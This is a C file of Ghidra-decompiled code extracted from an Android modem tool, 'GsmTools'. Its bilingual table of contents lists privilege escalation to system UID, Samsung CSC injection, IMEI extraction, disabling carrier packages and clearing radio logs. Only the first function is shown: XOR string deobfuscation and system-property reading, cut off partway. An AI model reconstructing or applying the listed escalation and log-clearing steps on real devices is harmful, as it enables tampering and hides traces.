/*
 * ============================================================================
 *  GsmTools - ISOLATED PHONE & MODEM LOGIC (Extracted from Ghidra Decompilation)
 * ============================================================================
 *  Original File: GHIDRA_DECOMPILED.c (103,915 lines)
 *  Filtered File: GHIDRA_PHONE_LOGIC_ONLY.c (~12,274 lines)
 *  Reduction: > 88% non-phone bloat eliminated (Bionic Libc, Libc++, Jemalloc, Unwind)
 * ============================================================================
 *  TABLE OF CONTENTS / فهرس الوظائف المستخلصة:
 *
 *  --- MODULE 1: Device Telemetry & Forensic Environment Checks (فحص بيئة الجهاز والخصائص) ---
 *  [01] FUN_0019c02c : ro.* Properties & Telemetry Acquisition | استخراج خصائص النظام ro.product, ro.csc, ro.build ومطابقتها
 *  [02] FUN_0019d9ec : SELinux & Root Environment Detection | فحص getenforce وحالة روت وسياق التنفيذ
 *  [03] FUN_001a3870 : Process Scanner (tsdaemon / ps check) | فحص العمليات النشطة وخاصة tsdaemon
 *  [04] FUN_001a4d04 : Dumpsys Package Version Reader | استخراج إصدارات حزم سامسونج مثل repaircal و retailagent
 *  [05] FUN_001a50c4 : IMEI Extractor via iphonesubinfo Parcel | استخراج IMEI عبر نداء service call iphonesubinfo
 *  [06] FUN_0019b07c : Shell Process Execution & Pipe Output Reader | تنفيذ أوامر الشل عبر popen وقراءة المخرجات
 *  [07] FUN_0019ba18 : Direct System Command Executor | تنفيذ أوامر النظام system() مباشرة
 *
 *  --- MODULE 2: Port 2600 Auto-Escalation & Relay (مصعد الصلاحيات عبر البورت 2600) ---
 *  [08] FUN_001a63e0 : Port 2600 Escalation & UID 1000 Handshake | التحقق من بورت 2600 وإيقاف ssud ورفع الصلاحيات لـ system
 *  [09] FUN_001a68d8 : Relay Listener & Command Dispatcher | إدارة الاتصال التكراري والترحيل للبورت 2600
 *  [10] FUN_001a55a8 : Threaded Execution Controller | إنشاء مسار معالجة خلفي لتنفيذ الأوامر بأمان
 *
 *  --- MODULE 3: Modem Channels & Device Discovery (اكتشاف وتهيئة قنوات المودم) ---
 *  [11] FUN_001a33e0 : Modem Channel Selector & SDK Version Router | تحديد القناة المناسبة حسب إصدار أندرويد SDK (<26, <30, >=30)
 *  [12] FUN_001a3950 : Modem Device Opener & TTY Configurator | فتح قنوات /dev/umts_* و /dev/smd* وضبط إعدادات termios
 *
 *  --- MODULE 4: RIL Socket & Samsung IPC Framing (بروتوكول RILD وحزم IPC) ---
 *  [13] FUN_001b65e0 : Samsung IPC Packet Framing & Hex Builder | تجميع وبناء إطارات بايتات IPC وحساب الطول والمحاذاة
 *  [14] FUN_001b6e44 : RIL OEM Hook Command Dispatcher | موزع أوامر RIL وتحويلها لنداءات OEM_HOOK_RAW
 *  [15] FUN_001b766c : RILD Socket Client & Parcel Transmitter | الاتصال بسوكيت /dev/socket/rild وتغليف Parcel وإرساله
 *
 *  --- MODULE 5: Samsung CSC Injection & Cleanup (حقن الـ CSC وتنظيف الحزم) ---
 *  [16] FUN_001a5c50 : Samsung CSC 5-Packet Injection Sequence | تسلسل حقن حزم CSC الخمس (0601... الخ)
 *  [17] FUN_001a4504 : CSC Package Uninstaller & Cleaner | إلغاء تثبيت com.sec.android.AutoPreconfig وتنظيف الكاش
 *  [18] FUN_001a483c : AutoPreconfig & OMA-DM Disabler | إيقاف وتعطيل حزم مشغلي الشبكات omadmspr
 *  [19] FUN_001a5830 : Radio Logcat Clear & USB Mode Switcher | مسح logcat -b radio وإعادة تشغيل نمط USB
 *
 *  --- MODULE 6: Main Interactive Shell Loop (الحلقة التفاعلية المركزية) ---
 *  [20] FUN_001a14d0 : Central Interactive Console (# Prompt) | معالج سطر الأوامر التفاعلي وتوزيع أوامر المستخدم
 *
 *  --- MODULE 7: Original License / DRM Check (Reference Only) (حماية التراخيص الأصلية) ---
 *  [21] FUN_001b89b0 : AuthKey Token Validation & Challenge-Response | نظام فحص الرمز وتأكيد المفتاح الأصلي للأداة
 *  [22] FUN_001b9b9c : Encrypted Payload Decryptor & Key Verification | فك تشفير مفتاح الجلسة والتحقق من التوقيع
 * ============================================================================
 */



// ============================================================================
// MODULE 1: Device Telemetry & Forensic Environment Checks (فحص بيئة الجهاز والخصائص)
// ============================================================================


/*
 * [PHONE FUNCTION] FUN_0019c02c
 * Purpose (EN): ro.* Properties & Telemetry Acquisition
 * Purpose (AR): استخراج خصائص النظام ro.product, ro.csc, ro.build ومطابقتها
 */

// Function: FUN_0019c02c @ 0019c02c
// ----------------------------------------------------------------

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined8 FUN_0019c02c(void)

{
  char *pcVar1;
  char cVar2;
  long lVar3;
  ulong uVar4;
  ulong uVar5;
  ulong uVar6;
  ulong uVar7;
  ulong uVar8;
  ulong uVar9;
  int iVar10;
  byte *pbVar11;
  undefined8 uVar12;
  size_t __n;
  long lVar13;
  undefined8 *puVar14;
  undefined4 *puVar15;
  undefined1 *puVar16;
  ulong uVar17;
  byte bVar18;
  byte bVar19;
  byte bVar20;
  byte bVar21;
  byte bVar22;
  byte bVar23;
  byte bVar24;
  byte bVar25;
  byte bVar26;
  byte bVar27;
  byte bVar28;
  byte bVar29;
  byte bVar30;
  byte bVar31;
  byte bVar32;
  byte bVar33;
  undefined8 uVar34;
  undefined8 uVar35;
  undefined8 uVar36;
  undefined8 uVar37;
  undefined8 uVar38;
  undefined8 uVar39;
  undefined8 uVar40;
  undefined8 uVar41;
  undefined8 uVar42;
  ulong local_e0;
  undefined8 local_d8;
  char *local_d0;
  ulong local_c8;
  undefined8 local_c0;
  char *local_b8;
  ulong local_b0;
  size_t local_a8;
  undefined1 *local_a0;
  char acStack_94 [92];
  long local_38;
  
  lVar3 = tpidr_el0;
  local_38 = *(long *)(lVar3 + 0x28);
  pbVar11 = (byte *)FUN_002295c4(&DAT_00233990);
  if ((*pbVar11 & 1) == 0) {
    puVar14 = (undefined8 *)FUN_002295c4(&DAT_00233970);
    uVar35 = DAT_00177a90;
    uVar12 = _DAT_00177820;
    puVar14[1] = _UNK_00177828;
    *puVar14 = uVar12;
    puVar14[2] = uVar35;
    *(undefined2 *)(puVar14 + 3) = 0x1eb;
    FUN_002234c0(&LAB_001a7e18,puVar14,0x2362d0);
    puVar16 = (undefined1 *)FUN_002295c4(&DAT_00233990);
    *puVar16 = 1;
  }
  uVar12 = FUN_002295c4(&DAT_00233970);
  FUN_001b5680();
  __system_property_get(uVar12,acStack_94);
  __n = strlen(acStack_94);
  if (0xffffffffffffffef < __n) {
                    /* WARNING: Subroutine does not return */
    FUN_00203188(&local_b0);
  }
  if (__n < 0x17) {
    puVar16 = (undefined1 *)((ulong)&local_b0 | 1);
    local_b0 = CONCAT71(local_b0._1_7_,(char)((int)__n << 1));
    if (__n != 0) goto LAB_0019c0d0;
  }
  else {
    uVar17 = __n + 0x10 & 0xfffffffffffffff0;
    puVar16 = (undefined1 *)FUN_00202bc0(uVar17);
    local_b0 = uVar17 | 1;
    local_a8 = __n;
    local_a0 = puVar16;
LAB_0019c0d0:
    memcpy(puVar16,acStack_94,__n);
  }
  puVar16[__n] = 0;
  iVar10 = FUN_002074d4(&local_b0,0,10);
  if ((local_b0 & 1) == 0) {
    local_b0 = local_b0 & 0xffffffffffff0000;
    if (0xb < iVar10) goto LAB_0019c84c;
LAB_0019c110:
    local_b8 = (char *)0x0;
    local_c0 = 0;
    local_c8 = 0;
    pbVar11 = (byte *)FUN_002295c4(&DAT_00233c90);
    if ((*pbVar11 & 1) == 0) {
      uVar12 = FUN_002295c4(&DAT_00233c70);
      FUN_001a8510(uVar12,&DAT_00177e76);
      FUN_002234c0(&LAB_001a87e4,uVar12,0x2362d0);
      puVar16 = (undefined1 *)FUN_002295c4(&DAT_00233c90);
      *puVar16 = 1;
      lVar13 = FUN_002295c4(&DAT_00233c70);
      cVar2 = *(char *)(lVar13 + 0x59);
    }
    else {
      lVar13 = FUN_002295c4(&DAT_00233c70);
      cVar2 = *(char *)(lVar13 + 0x59);
    }
    if (cVar2 != '\0') {
      puVar14 = (undefined8 *)FUN_002295c4(&DAT_00233c70);
      uVar35 = _UNK_00176fa8;
      uVar12 = _DAT_00176fa0;
      *(undefined1 *)((long)puVar14 + 0x59) = 0;
      uVar36 = puVar14[1];
      uVar34 = *puVar14;
      uVar38 = puVar14[3];
      uVar37 = puVar14[2];
      bVar18 = (byte)uVar12;
      bVar19 = (byte)((ulong)uVar12 >> 8);
      bVar20 = (byte)((ulong)uVar12 >> 0x10);
      bVar21 = (byte)((ulong)uVar12 >> 0x18);
      bVar22 = (byte)((ulong)uVar12 >> 0x20);
      bVar23 = (byte)((ulong)uVar12 >> 0x28);
      bVar24 = (byte)((ulong)uVar12 >> 0x30);
      bVar25 = (byte)((ulong)uVar12 >> 0x38);
      bVar26 = (byte)uVar35;
      bVar27 = (byte)((ulong)uVar35 >> 8);
      bVar28 = (byte)((ulong)uVar35 >> 0x10);
      bVar29 = (byte)((ulong)uVar35 >> 0x18);
      bVar30 = (byte)((ulong)uVar35 >> 0x20);
      bVar31 = (byte)((ulong)uVar35 >> 0x28);
      bVar32 = (byte)((ulong)uVar35 >> 0x30);
      bVar33 = (byte)((ulong)uVar35 >> 0x38);
      *(byte *)(puVar14 + 10) = *(byte *)(puVar14 + 10) ^ 0x3f;
      *(byte *)((long)puVar14 + 0x51) = *(byte *)((long)puVar14 + 0x51) ^ 0x3b;
      uVar35 = puVar14[5];
      uVar12 = puVar14[4];
      uVar40 = puVar14[7];
      uVar39 = puVar14[6];
      *(byte *)((long)puVar14 + 0x52) = *(byte *)((long)puVar14 + 0x52) ^ 0xa5;
      *(byte *)((long)puVar14 + 0x53) = *(byte *)((long)puVar14 + 0x53) ^ 0x1f;
      *(byte *)((long)puVar14 + 0x54) = *(byte *)((long)puVar14 + 0x54) ^ 0xa7;
      *(byte *)((long)puVar14 + 0x55) = *(byte *)((long)puVar14 + 0x55) ^ 0xef;
      uVar42 = puVar14[9];
      uVar41 = puVar14[8];
      puVar14[1] = CONCAT17((byte)((ulong)uVar36 >> 0x38) ^ bVar33,
                            CONCAT16((byte)((ulong)uVar36 >> 0x30) ^ bVar32,
                                     CONCAT15((byte)((ulong)uVar36 >> 0x28) ^ bVar31,
                                              CONCAT14((byte)((ulong)uVar36 >> 0x20) ^ bVar30,
                                                       CONCAT13((byte)((ulong)uVar36 >> 0x18) ^
                                                                bVar29,CONCAT12((byte)((ulong)uVar36
                                                                                      >> 0x10) ^
                                                                                bVar28,CONCAT11((
                                                  byte)((ulong)uVar36 >> 8) ^ bVar27,
                                                  (byte)uVar36 ^ bVar26)))))));
      *puVar14 = CONCAT17((byte)((ulong)uVar34 >> 0x38) ^ bVar25,
                          CONCAT16((byte)((ulong)uVar34 >> 0x30) ^ bVar24,
                                   CONCAT15((byte)((ulong)uVar34 >> 0x28) ^ bVar23,
                                            CONCAT14((byte)((ulong)uVar34 >> 0x20) ^ bVar22,
                                                     CONCAT13((byte)((ulong)uVar34 >> 0x18) ^ bVar21
                                                              ,CONCAT12((byte)((ulong)uVar34 >> 0x10
                                                                              ) ^ bVar20,
                                                                        CONCAT11((byte)((ulong)
                                                  uVar34 >> 8) ^ bVar19,(byte)uVar34 ^ bVar18)))))))
      ;
      puVar14[3] = CONCAT17((byte)((ulong)uVar38 >> 0x38) ^ bVar33,
                            CONCAT16((byte)((ulong)uVar38 >> 0x30) ^ bVar32,
                                     CONCAT15((byte)((ulong)uVar38 >> 0x28) ^ bVar31,
                                              CONCAT14((byte)((ulong)uVar38 >> 0x20) ^ bVar30,
                                                       CONCAT13((byte)((ulong)uVar38 >> 0x18) ^
                                                                bVar29,CONCAT12((byte)((ulong)uVar38
                                                                                      >> 0x10) ^
                                                                                bVar28,CONCAT11((
                                                  byte)((ulong)uVar38 >> 8) ^ bVar27,
                                                  (byte)uVar38 ^ bVar26)))))));
      puVar14[2] = CONCAT17((byte)((ulong)uVar37 >> 0x38) ^ bVar25,
                            CONCAT16((byte)((ulong)uVar37 >> 0x30) ^ bVar24,
                                     CONCAT15((byte)((ulong)uVar37 >> 0x28) ^ bVar23,
                                              CONCAT14((byte)((ulong)uVar37 >> 0x20) ^ bVar22,
                                                       CONCAT13((byte)((ulong)uVar37 >> 0x18) ^
                                                                bVar21,CONCAT12((byte)((ulong)uVar37
                                                                                      >> 0x10) ^
                                                                                bVar20,CONCAT11((
                                                  byte)((ulong)uVar37 >> 8) ^ bVar19,
                                                  (byte)uVar37 ^ bVar18)))))));
      *(byte *)((long)puVar14 + 0x56) = *(byte *)((long)puVar14 + 0x56) ^ 0x77;
      puVar14[5] = CONCAT17((byte)((ulong)uVar35 >> 0x38) ^ bVar33,
                            CONCAT16((byte)((ulong)uVar35 >> 0x30) ^ bVar32,
                                     CONCAT15((byte)((ulong)uVar35 >> 0x28) ^ bVar31,
                                              CONCAT14((byte)((ulong)uVar35 >> 0x20) ^ bVar30,
                                                       CONCAT13((byte)((ulong)uVar35 >> 0x18) ^
                                                                bVar29,CONCAT12((byte)((ulong)uVar35
                                                                                      >> 0x10) ^
                                                                                bVar28,CONCAT11((
                                                  byte)((ulong)uVar35 >> 8) ^ bVar27,
                                                  (byte)uVar35 ^ bVar26)))))));
      puVar14[4] = CONCAT17((byte)((ulong)uVar12 >> 0x38) ^ bVar25,
                            CONCAT16((byte)((ulong)uVar12 >> 0x30) ^ bVar24,
                                     CONCAT15((byte)((ulong)uVar12 >> 0x28) ^ bVar23,
                                              CONCAT14((byte)((ulong)uVar12 >> 0x20) ^ bVar22,
                                                       CONCAT13((byte)((ulong)uVar12 >> 0x18) ^
                                                                bVar21,CONCAT12((byte)((ulong)uVar12
                                                                                      >> 0x10) ^
                                                                                bVar20,CONCAT11((
                                                  byte)((ulong)uVar12 >> 8) ^ bVar19,
                                                  (byte)uVar12 ^ bVar18)))))));
      puVar14[7] = CONCAT17((byte)((ulong)uVar40 >> 0x38) ^ bVar33,
                            CONCAT16((byte)((ulong)uVar40 >> 0x30) ^ bVar32,
                                     CONCAT15((byte)((ulong)uVar40 >> 0x28) ^ bVar31,
                                              CONCAT14((byte)((ulong)uVar40 >> 0x20) ^ bVar30,
                                                       CONCAT13((byte)((ulong)uVar40 >> 0x18) ^
                                                                bVar29,CONCAT12((byte)((ulong)uVar40
                                                                                      >> 0x10) ^
                                                                                bVar28,CONCAT11((
                                                  byte)((ulong)uVar40 >> 8) ^ bVar27,
                                                  (byte)uVar40 ^ bVar26)))))));
      puVar14[6] = CONCAT17((byte)((ulong)uVar39 >> 0x38) ^ bVar25,
                            CONCAT16((byte)((ulong)uVar39 >> 0x30) ^ bVar24,
                                     CONCAT15((byte)((ulong)uVar39 >> 0x28) ^ bVar23,
                                              CONCAT14((byte)((ulong)uVar39 >> 0x20) ^ bVar22,
                                                       CONCAT13((byte)((ulong)uVar39 >> 0x18) ^
                                                                bVar21,CONCAT12((byte)((ulong)uVar39
                                                                                      >> 0x10) ^
                                                                                bVar20,CONCAT11((
                                                  byte)((ulong)uVar39 >> 8) ^ bVar19,
                                                  (byte)uVar39 ^ bVar18)))))));
      puVar14[9] = CONCAT17((byte)((ulong)uVar42 >> 0x38) ^ bVar33,
                            CONCAT16((byte)((ulong)uVar42 >> 0x30) ^ bVar32,
                                     CONCAT15((byte)((ulong)uVar42 >> 0x28) ^ bVar31,
                                              CONCAT14((byte)((ulong)uVar42 >> 0x20) ^ bVar30,
                                                       CONCAT13((byte)((ulong)uVar42 >> 0x18) ^
                                                                bVar29,CONCAT12((byte)((ulong)uVar42
                                                                                      >> 0x10) ^
                                                                                bVar28,CONCAT11((
                                                  byte)((ulong)uVar42 >> 8) ^ bVar27,
                                                  (byte)uVar42 ^ bVar26)))))));
      puVar14[8] = CONCAT17((byte)((ulong)uVar41 >> 0x38) ^ bVar25,
                            CONCAT16((byte)((ulong)uVar41 >> 0x30) ^ bVar24,
                                     CONCAT15((byte)((ulong)uVar41 >> 0x28) ^ bVar23,
                                              CONCAT14((byte)((ulong)uVar41 >> 0x20) ^ bVar22,
                                                       CONCAT13((byte)((ulong)uVar41 >> 0x18) ^
                                                                bVar21,CONCAT12((byte)((ulong)uVar41
                                                                                      >> 0x10) ^
                                                                                bVar20,CONCAT11((
                                                  byte)((ulong)uVar41 >> 8) ^ bVar19,
                                                  (byte)uVar41 ^ bVar18)))))));
      *(byte *)((long)puVar14 + 0x57) = *(byte *)((long)puVar14 + 0x57) ^ 0x9b;
      *(byte *)(puVar14 + 0xb) = *(byte *)(puVar14 + 0xb) ^ 0x3f;
    }
    uVar12 = FUN_002295c4(&DAT_00233c70);
    FUN_00205098(&local_c8,uVar12);
    pbVar11 = (byte *)FUN_002295c4(&DAT_00233cd0);
    if ((*pbVar11 & 1) == 0) {
      puVar15 = (undefined4 *)FUN_002295c4(&DAT_00233cb0);
      *puVar15 = 0x1d39f42;
      FUN_002234c0(&LAB_001a87fc,puVar15,0x2362d0);
      puVar16 = (undefined1 *)FUN_002295c4(&DAT_00233cd0);
      *puVar16 = 1;
      lVar13 = FUN_002295c4(&DAT_00233cb0);
      cVar2 = *(char *)(lVar13 + 3);
    }
    else {
      lVar13 = FUN_002295c4(&DAT_00233cb0);
      cVar2 = *(char *)(lVar13 + 3);
    }
    if (cVar2 != '\0') {
      pbVar11 = (byte *)FUN_002295c4(&DAT_00233cb0);
      pbVar11[3] = 0;
      *pbVar11 = *pbVar11 ^ 0x7b;
      pbVar11[1] = pbVar11[1] ^ 0x95;
      pbVar11[2] = pbVar11[2] ^ 0xd3;
    }
    uVar12 = FUN_002295c4(&DAT_00233cb0);
    FUN_00205098(&local_c8,uVar12);
    pbVar11 = (byte *)FUN_002295c4(&DAT_00233d10);
    if ((*pbVar11 & 1) == 0) {
      puVar14 = (undefined8 *)FUN_002295c4(&DAT_00233cf0);
      uVar35 = _UNK_001775e8;
      uVar12 = _DAT_001775e0;
      *(undefined1 *)(puVar14 + 2) = 1;
      puVar14[1] = uVar35;
      *puVar14 = uVar12;
      FUN_002234c0(&LAB_001a8808,puVar14,0x2362d0);
      puVar16 = (undefined1 *)FUN_002295c4(&DAT_00233d10);
      *puVar16 = 1;
      lVar13 = FUN_002295c4(&DAT_00233cf0);
      cVar2 = *(char *)(lVar13 + 0x10);
    }
    else {
      lVar13 = FUN_002295c4(&DAT_00233cf0);
      cVar2 = *(char *)(lVar13 + 0x10);
    }
    if (cVar2 != '\0') {
      puVar14 = (undefined8 *)FUN_002295c4(&DAT_00233cf0);
      uVar35 = puVar14[1];
      uVar12 = *puVar14;
      *(undefined1 *)(puVar14 + 2) = 0;
      bVar18 = (byte)_DAT_00176ef0;
      uVar17 = (ulong)_DAT_00176ef0 >> 8;
      uVar4 = (ulong)_DAT_00176ef0 >> 0x10;
      uVar5 = (ulong)_DAT_00176ef0 >> 0x18;
      uVar6 = (ulong)_DAT_00176ef0 >> 0x20;
      uVar7 = (ulong)_DAT_00176ef0 >> 0x28;
      uVar8 = (ulong)_DAT_00176ef0 >> 0x30;
      uVar9 = (ulong)_DAT_00176ef0 >> 0x38;
      puVar14[1] = CONCAT17((byte)((ulong)uVar35 >> 0x38) ^ (byte)((ulong)_UNK_00176ef8 >> 0x38),
                            CONCAT16((byte)((ulong)uVar35 >> 0x30) ^
                                     (byte)((ulong)_UNK_00176ef8 >> 0x30),
                                     CONCAT15((byte)((ulong)uVar35 >> 0x28) ^
                                              (byte)((ulong)_UNK_00176ef8 >> 0x28),
                                              CONCAT14((byte)((ulong)uVar35 >> 0x20) ^
                                                       (byte)((ulong)_UNK_00176ef8 >> 0x20),
                                                       CONCAT13((byte)((ulong)uVar35 >> 0x18) ^
                                                                (byte)((ulong)_UNK_00176ef8 >> 0x18)
                                                                ,CONCAT12((byte)((ulong)uVar35 >>
                                                                                0x10) ^
                                                                          (byte)((ulong)
                                                  _UNK_00176ef8 >> 0x10),
                                                  CONCAT11((byte)((ulong)uVar35 >> 8) ^
                                                           (byte)((ulong)_UNK_00176ef8 >> 8),
                                                           (byte)uVar35 ^ (byte)_UNK_00176ef8)))))))
      ;
      *puVar14 = CONCAT17((byte)((ulong)uVar12 >> 0x38) ^ (byte)uVar9,
                          CONCAT16((byte)((ulong)uVar12 >> 0x30) ^ (byte)uVar8,
                                   CONCAT15((byte)((ulong)uVar12 >> 0x28) ^ (byte)uVar7,
                                            CONCAT14((byte)((ulong)uVar12 >> 0x20) ^ (byte)uVar6,
                                                     CONCAT13((byte)((ulong)uVar12 >> 0x18) ^
                                                              (byte)uVar5,
                                                              CONCAT12((byte)((ulong)uVar12 >> 0x10)
                                                                       ^ (byte)uVar4,
                                                                       CONCAT11((byte)((ulong)uVar12
                                                                                      >> 8) ^
                                                                                (byte)uVar17,
                                                                                (byte)uVar12 ^
                                                                                bVar18)))))));
    }
    uVar12 = FUN_002295c4(&DAT_00233cf0);
    FUN_00205098(&local_c8,uVar12);
    pbVar11 = (byte *)FUN_002295c4(&DAT_00233d50);
    if ((*pbVar11 & 1) == 0) {
      puVar14 = (undefined8 *)FUN_002295c4(&DAT_00233d30);
      uVar12 = _DAT_001772c0;
      puVar14[1] = _UNK_001772c8;
      *puVar14 = uVar12;
      FUN_002234c0(&LAB_001a8810,puVar14,0x2362d0);
      puVar16 = (undefined1 *)FUN_002295c4(&DAT_00233d50);
      *puVar16 = 1;
      lVar13 = FUN_002295c4(&DAT_00233d30);
      cVar2 = *(char *)(lVar13 + 0xf);
    }
    else {
      lVar13 = FUN_002295c4(&DAT_00233d30);
      cVar2 = *(char *)(lVar13 + 0xf);
    }
    if (cVar2 != '\0') {
      puVar14 = (undefined8 *)FUN_002295c4(&DAT_00233d30);
      *(undefined1 *)((long)puVar14 + 0xf) = 0;
      uVar12 = DAT_00177ab8;
      uVar35 = *puVar14;
      *(byte *)((long)puVar14 + 9) = *(byte *)((long)puVar14 + 9) ^ 0x8f;
      *(byte *)(puVar14 + 1) = *(byte *)(puVar14 + 1) ^ 0x4d;
      *(byte *)((long)puVar14 + 10) = *(byte *)((long)puVar14 + 10) ^ 0xf7;
      *(byte *)((long)puVar14 + 0xb) = *(byte *)((long)puVar14 + 0xb) ^ 0x95;
      *puVar14 = CONCAT17((byte)((ulong)uVar35 >> 0x38) ^ (byte)((ulong)uVar12 >> 0x38),
                          CONCAT16((byte)((ulong)uVar35 >> 0x30) ^ (byte)((ulong)uVar12 >> 0x30),
                                   CONCAT15((byte)((ulong)uVar35 >> 0x28) ^
                                            (byte)((ulong)uVar12 >> 0x28),
                                            CONCAT14((byte)((ulong)uVar35 >> 0x20) ^
                                                     (byte)((ulong)uVar12 >> 0x20),
                                                     CONCAT13((byte)((ulong)uVar35 >> 0x18) ^
                                                              (byte)((ulong)uVar12 >> 0x18),
                                                              CONCAT12((byte)((ulong)uVar35 >> 0x10)
                                                                       ^ (byte)((ulong)uVar12 >>
                                                                               0x10),
                                                                       CONCAT11((byte)((ulong)uVar35
                                                                                      >> 8) ^
                                                                                (byte)((ulong)uVar12
                                                                                      >> 8),
                                                                                (byte)uVar35 ^
                                                                                (byte)uVar12)))))));
      *(byte *)((long)puVar14 + 0xc) = *(byte *)((long)puVar14 + 0xc) ^ 0x17;
      *(byte *)((long)puVar14 + 0xd) = *(byte *)((long)puVar14 + 0xd) ^ 0x1b;
      *(byte *)((long)puVar14 + 0xe) = *(byte *)((long)puVar14 + 0xe) ^ 0xc9;
    }
    uVar12 = FUN_002295c4(&DAT_00233d30);
    FUN_00205098(&local_c8,uVar12);
    pbVar11 = (byte *)FUN_002295c4(&DAT_00233d90);
    if ((*pbVar11 & 1) == 0) {
      puVar14 = (undefined8 *)FUN_002295c4(&DAT_00233d70);
      uVar12 = _DAT_001773a0;
      puVar14[1] = _UNK_001773a8;
      *puVar14 = uVar12;
      FUN_002234c0(&LAB_001a881c,puVar14,0x2362d0);
      puVar16 = (undefined1 *)FUN_002295c4(&DAT_00233d90);
      *puVar16 = 1;
      lVar13 = FUN_002295c4(&DAT_00233d70);
      cVar2 = *(char *)(lVar13 + 0xf);
    }
    else {
      lVar13 = FUN_002295c4(&DAT_00233d70);
      cVar2 = *(char *)(lVar13 + 0xf);
    }
    if (cVar2 != '\0') {
      puVar14 = (undefined8 *)FUN_002295c4(&DAT_00233d70);
      uVar12 = *puVar14;
      *(undefined1 *)((long)puVar14 + 0xf) = 0;
      bVar18 = (byte)DAT_00177a48;
      uVar17 = (ulong)DAT_00177a48 >> 8;
      uVar4 = (ulong)DAT_00177a48 >> 0x10;
      uVar5 = (ulong)DAT_00177a48 >> 0x18;
      uVar6 = (ulong)DAT_00177a48 >> 0x20;
      uVar7 = (ulong)DAT_00177a48 >> 0x28;
      uVar8 = (ulong)DAT_00177a48 >> 0x30;
      uVar9 = (ulong)DAT_00177a48 >> 0x38;
      *(byte *)(puVar14 + 1) = *(byte *)(puVar14 + 1) ^ 0x1d;
      *(byte *)((long)puVar14 + 9) = *(byte *)((long)puVar14 + 9) ^ 0xdb;
      *(byte *)((long)puVar14 + 10) = *(byte *)((long)puVar14 + 10) ^ 0xd9;
      *(byte *)((long)puVar14 + 0xb) = *(byte *)((long)puVar14 + 0xb) ^ 0xb5;
      *(byte *)((long)puVar14 + 0xc) = *(byte *)((long)puVar14 + 0xc) ^ 0xc9;
      *puVar14 = CONCAT17((byte)((ulong)uVar12 >> 0x38) ^ (byte)uVar9,
                          CONCAT16((byte)((ulong)uVar12 >> 0x30) ^ (byte)uVar8,
                                   CONCAT15((byte)((ulong)uVar12 >> 0x28) ^ (byte)uVar7,
                                            CONCAT14((byte)((ulong)uVar12 >> 0x20) ^ (byte)uVar6,
                                                     CONCAT13((byte)((ulong)uVar12 >> 0x18) ^
                                                              (byte)uVar5,
                                                              CONCAT12((byte)((ulong)uVar12 >> 0x10)
                                                                       ^ (byte)uVar4,
                                                                       CONCAT11((byte)((ulong)uVar12
                                                                                      >> 8) ^
                                                                                (byte)uVar17,
                                                                                (byte)uVar12 ^
                                                                                bVar18)))))));
      *(byte *)((long)puVar14 + 0xd) = *(byte *)((long)puVar14 + 0xd) ^ 0xab;
      *(byte *)((long)puVar14 + 0xe) = *(byte *)((long)puVar14 + 0xe) ^ 0x8b;
    }
    uVar12 = FUN_002295c4(&DAT_00233d70);
    FUN_00205098(&local_c8,uVar12);
    pbVar11 = (byte *)FUN_002295c4(&DAT_00233dd0);
    if ((*pbVar11 & 1) == 0) {
      puVar14 = (undefined8 *)FUN_002295c4(&DAT_00233db0);
      uVar36 = _UNK_001770e8;
      uVar34 = _DAT_001770e0;
      uVar35 = _UNK_00176e08;
      uVar12 = _DAT_00176e00;
      *(undefined1 *)(puVar14 + 4) = 1;
      puVar14[1] = uVar36;
      *puVar14 = uVar34;
      puVar14[3] = uVar35;
      puVar14[2] = uVar12;
      FUN_002234c0(&LAB_001a8828,puVar14,0x2362d0);
      puVar16 = (undefined1 *)FUN_002295c4(&DAT_00233dd0);
      *puVar16 = 1;
    }
    uVar12 = FUN_002295c4(&DAT_00233db0);
    FUN_001b583c();
    FUN_00205098(&local_c8,uVar12);
    pbVar11 = (byte *)FUN_002295c4(&DAT_00233e10);
    if ((*pbVar11 & 1) == 0) {
      puVar14 = (undefined8 *)FUN_002295c4(&DAT_00233df0);
      uVar35 = _UNK_00176e18;
      uVar12 = _DAT_00176e10;
      *(undefined1 *)((long)puVar14 + 0x12) = 1;
      puVar14[1] = uVar35;
      *puVar14 = uVar12;
      *(undefined2 *)(puVar14 + 2) = 0xa97d;
      FUN_002234c0(&LAB_001a8834,puVar14,0x2362d0);
      puVar16 = (undefined1 *)FUN_002295c4(&DAT_00233e10);
      *puVar16 = 1;
    }
    uVar12 = FUN_002295c4(&DAT_00233df0);
    FUN_001b5864();
    FUN_00205098(&local_c8,uVar12);
    pbVar11 = (byte *)FUN_002295c4(&DAT_00233e50);
    if ((*pbVar11 & 1) == 0) {
      puVar14 = (undefined8 *)FUN_002295c4(&DAT_00233e30);
      uVar12 = _DAT_00176cb0;
      puVar14[1] = _UNK_00176cb8;
      *puVar14 = uVar12;
      *(undefined4 *)(puVar14 + 2) = 0x149bd44;
      FUN_002234c0(&LAB_001a8840,puVar14,0x2362d0);
      puVar16 = (undefined1 *)FUN_002295c4(&DAT_00233e50);
      *puVar16 = 1;
    }
    uVar12 = FUN_002295c4(&DAT_00233e30);
    FUN_001b58a4();
    FUN_00205098(&local_c8,uVar12);
    pbVar11 = (byte *)FUN_002295c4(&DAT_00233e90);
    if ((*pbVar11 & 1) == 0) {
      puVar14 = (undefined8 *)FUN_002295c4(&DAT_00233e70);
      uVar12 = _DAT_00176cc0;
      puVar14[1] = _UNK_00176cc8;
      *puVar14 = uVar12;
      FUN_002234c0(&LAB_001a884c,puVar14,0x2362d0);
      puVar16 = (undefined1 *)FUN_002295c4(&DAT_00233e90);
      *puVar16 = 1;
      lVar13 = FUN_002295c4(&DAT_00233e70);
      cVar2 = *(char *)(lVar13 + 0xf);
    }
    else {
      lVar13 = FUN_002295c4(&DAT_00233e70);
      cVar2 = *(char *)(lVar13 + 0xf);
    }
    if (cVar2 != '\0') {
      puVar14 = (undefined8 *)FUN_002295c4(&DAT_00233e70);
      *(undefined1 *)((long)puVar14 + 0xf) = 0;
      uVar12 = DAT_00177ac0;
      uVar35 = *puVar14;
      *(byte *)((long)puVar14 + 9) = *(byte *)((long)puVar14 + 9) ^ 0x6b;
      *(byte *)(puVar14 + 1) = *(byte *)(puVar14 + 1) ^ 0x67;
      *(byte *)((long)puVar14 + 10) = *(byte *)((long)puVar14 + 10) ^ 0xd;
      *(byte *)((long)puVar14 + 0xb) = *(byte *)((long)puVar14 + 0xb) ^ 0x73;
      *(byte *)((long)puVar14 + 0xc) = *(byte *)((long)puVar14 + 0xc) ^ 0x45;
